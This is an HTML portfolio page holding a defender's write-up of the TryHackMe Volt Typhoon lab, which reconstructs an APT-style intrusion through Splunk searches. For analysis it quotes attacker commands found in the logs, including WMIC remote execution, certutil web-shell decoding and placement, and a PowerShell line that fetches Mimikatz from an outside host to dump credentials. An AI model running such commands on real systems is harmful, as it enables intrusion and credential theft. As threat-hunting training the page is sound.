@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>TryHackMe Volt Typhoon Writeup | Kossi Richard Allado</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="../../../assets/site.css?v=20260514-volt-typhoon" />
+</head>
+<body>
+  <div class="shell">
+    <aside class="sidebar">
+      <div>
+        <div class="profile"><img class="avatar" src="../../../richard.jpg" alt="Kossi Richard Allado" /><div><div class="name">Kossi Richard Allado</div><p class="role">Threat hunting notes focused on reasoning, evidence and reproducible Splunk searches.</p></div></div>
+        <nav class="nav"><a href="../../../index.html"><span>01</span> Home</a><a href="../../../proof.html"><span>02</span> Proof</a><a href="../../../labs.html"><span>03</span> Labs</a><a class="active" href="../../../writeups.html"><span>04</span> Writeups</a><a href="../../../projects.html"><span>05</span> Projects</a></nav>
+      </div>
+      <div class="social"><a href="https://github.com/ALLAKORI" target="_blank" rel="noreferrer">Gh</a><a href="mailto:alladokossirichard2025@gmail.com">@</a></div>
+    </aside>
+    <main class="page">
+      <div class="topline"><div class="crumb"><a href="../../../index.html">Portfolio</a> / <a href="../../../writeups.html">Writeups</a> / <strong>Volt Typhoon</strong></div><div class="mono">TryHackMe - Splunk - DFIR</div></div>
+      <section class="hero compact">
+        <p class="meta">TryHackMe / Threat hunting</p>
+        <h1>Volt Typhoon intrusion investigation with <span class="accent">Splunk evidence</span>.</h1>
+        <p>I retraced an APT-style intrusion through ADSelfService Plus, WMIC, PowerShell, web shells, credential access, C2 proxying and cleanup activity.</p>
+        <div class="tags"><span class="tag green">Room completed</span><span class="tag blue">Splunk</span><span class="tag blue">PowerShell</span><span class="tag violet">DFIR</span><span class="tag amber">MITRE ATT&amp;CK</span></div>
+      </section>
+
+      <section class="section">
+        <div class="grid grid-4">
+          <article class="stat-card"><strong>100%</strong><span>Room completed</span></article>
+          <article class="stat-card"><strong>11</strong><span>Investigation phases</span></article>
+          <article class="stat-card"><strong>Splunk</strong><span>Main analysis tool</span></article>
+          <article class="stat-card"><strong>APT</strong><span>Volt Typhoon scenario</span></article>
+        </div>
+      </section>
+
+      <section class="section">
+        <div class="writeup-layout">
+          <aside class="writeup-toc">
+            <a href="#summary">Summary</a>
+            <a href="#timeline">Timeline</a>
+            <a href="#findings">Findings</a>
+            <a href="#iocs">Indicators</a>
+            <a href="#lessons">Lessons</a>
+          </aside>
+          <article class="writeup-article">
+            <h2 id="summary">Investigation Summary</h2>
+            <p>The intrusion started with the takeover of the <code>dean-admin</code> account through ADSelfService Plus. After that, the attacker created <code>voltyp-admin</code>, used WMIC and PowerShell for execution, staged sensitive data, deployed a web shell, performed credential access, configured a C2 proxy, and cleared logs.</p>
+
+            <div class="callout">
+              <strong>Main result</strong>
+              <span>The attack chain was reconstructed from Splunk logs by pivoting across ADSelfService Plus, WMIC and PowerShell events.</span>
+            </div>
+
+            <h2 id="timeline">Attack Timeline</h2>
+            <div class="timeline">
+              <div class="timeline-item"><span class="date">2024-03-24 11:10:22</span><strong>Initial access</strong><p><code>dean-admin</code> password was changed through ADSelfService Plus from <code>192.168.1.134</code>.</p></div>
+              <div class="timeline-item"><span class="date">2024-03-25</span><strong>WMIC execution</strong><p>The attacker enumerated drives on <code>server01</code> and <code>server02</code>, then compressed an AD database copy with 7-Zip.</p></div>
+              <div class="timeline-item"><span class="date">2024-03-28</span><strong>Persistence and credential access</strong><p>A web shell was decoded into <code>C:\Windows\Temp\</code>. Obfuscated PowerShell downloaded and ran Mimikatz.</p></div>
+              <div class="timeline-item"><span class="date">2024-03-29</span><strong>Lateral movement, C2 and cleanup</strong><p>The web shell was copied to <code>server-02</code>, a <code>netsh</code> proxy was configured, and event logs were cleared.</p></div>
+            </div>
+
+            <h2 id="findings">Key Findings</h2>
+            <h3>Initial Access</h3>
+            <p>I searched ADSelfService Plus logs for password changes linked to <code>dean-admin</code>:</p>
+            <pre><code>index=* service_name=ADSelfServicePlus username="dean-admin" "password change"</code></pre>
+            <p>The successful takeover happened at <code>2024-03-24T11:10:22</code>. By reviewing username values and rare entries, I identified the newly created administrator account: <code>voltyp-admin</code>.</p>
+
+            <h3>Execution</h3>
+            <p>For WMIC activity, I filtered on the WMIC sourcetype and target server names:</p>
+            <pre><code>index="main" sourcetype="wmic" "*server01*" "*server02*"</code></pre>
+            <pre><code>wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename</code></pre>
+            <p>When searching for the AD database copy, my first <code>ntds</code> search did not directly reveal the answer. Pivoting to compression artifacts with <code>7z</code> exposed the archive password.</p>
+            <pre><code>index="main" sourcetype="wmic" "*7z*"</code></pre>
+            <pre><code>wmic /node:webserver-01 process call create "cmd.exe /c 7z a -v100m -p d5ag0nm@5t3r -t7z cisco-up.7z C:\inetpub\wwwroot\temp.dit"</code></pre>
+
+            <h3>Persistence</h3>
+            <p>The attacker decoded a web shell into a temporary directory and then copied it into an IIS web root on <code>server-02</code>:</p>
+            <pre><code>certutil -decode C:\Windows\Temp\ntuser.ini C:\Windows\Temp\iisstart.aspx</code></pre>
+            <pre><code>Copy-Item -Path "C:\Windows\Temp\iisstart.aspx" -Destination "\\server-02\C$\inetpub\wwwroot\AuditReport.jspx"</code></pre>
+            <p>The original placement in <code>C:\Windows\Temp\</code> was suspicious because temporary directories are commonly used for staging payloads.</p>
+
+            <h3>Defense Evasion</h3>
+            <p>The attacker removed RDP MRU traces using:</p>
+            <pre><code>Remove-ItemProperty</code></pre>
+            <p>They also renamed the archive to look like an image:</p>
+            <pre><code>cisco-up.7z -> c164.gif</code></pre>
+            <p>Finally, the attacker checked for virtualized environment indicators under:</p>
+            <pre><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control</code></pre>
+
+            <h3>Credential Access</h3>
+            <p>Registry queries showed hunting for credentials in remote access tools:</p>
+            <pre><code>OpenSSH, putty, realvnc</code></pre>
+            <p>The Mimikatz command was base64-obfuscated. Searching for encoded execution patterns helped reveal it:</p>
+            <pre><code>index="main" "exec" "="</code></pre>
+            <pre><code>Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp","exit") -NoNewWindow -Wait</code></pre>
+
+            <h3>Discovery and Lateral Movement</h3>
+            <p>The attacker queried Windows event logs with <code>wevtutil</code> and searched for event IDs <code>4624 4625 4769</code>. For lateral movement, a precise search isolated the web shell copy to <code>server-02</code>:</p>
+            <pre><code>index="main" aspx server-02</code></pre>
+            <p>The new web shell was <code>AuditReport.jspx</code>.</p>
+
+            <h3>Collection, C2 and Cleanup</h3>
+            <p>Financial files were copied from <code>C:\ProgramData\FinanceBackup\</code> to <code>C:\Windows\Temp\faudit\</code>:</p>
+            <pre><code>2022.csv 2023.csv 2024.csv</code></pre>
+            <p>The attacker configured C2 proxying with <code>netsh</code>:</p>
+            <pre><code>10.2.30.1 8443</code></pre>
+            <p>Cleanup activity cleared four logs:</p>
+            <pre><code>Application Security Setup System</code></pre>
+
+            <h2 id="iocs">Indicators</h2>
+            <div class="table-wrap">
+              <table>
+                <thead><tr><th>Type</th><th>Indicator</th></tr></thead>
+                <tbody>
+                  <tr><td>Compromised account</td><td><code>dean-admin</code></td></tr>
+                  <tr><td>Created admin account</td><td><code>voltyp-admin</code></td></tr>
+                  <tr><td>Initial access time</td><td><code>2024-03-24T11:10:22</code></td></tr>
+                  <tr><td>Archive password</td><td><code>d5ag0nm@5t3r</code></td></tr>
+                  <tr><td>Archive disguise</td><td><code>c164.gif</code></td></tr>
+                  <tr><td>Web shell</td><td><code>AuditReport.jspx</code></td></tr>
+                  <tr><td>C2 endpoint</td><td><code>10.2.30.1:8443</code></td></tr>
+                  <tr><td>Mimikatz URL</td><td><code>http://voltyp.com/3/tlz/mimikatz.exe</code></td></tr>
+                </tbody>
+              </table>
+            </div>
+
+            <h2 id="lessons">Lessons Learned</h2>
+            <p>This lab taught me to pivot from exact keywords to attacker behavior. Searching directly for <code>ntds</code> or <code>mimikatz</code> was not always enough, but looking for compression commands, encoded PowerShell flags and staging paths revealed the chain. The full intrusion was visible because the events were analyzed as a sequence instead of isolated answers.</p>
+            <p>It also reinforced how living-off-the-land tools can hide malicious activity in normal administration noise. WMIC, PowerShell, <code>certutil</code>, <code>netsh</code> and <code>wevtutil</code> are legitimate, but their combined usage formed a clear attack story.</p>
+          </article>
+        </div>
+      </section>
+      <footer class="footer mono">TryHackMe Volt Typhoon - completed 2026-05-14.</footer>
+    </main>
+  </div>
+  <script src="../../../assets/lang.js?v=20260506-portfolio"></script>
+</body>
+</html>
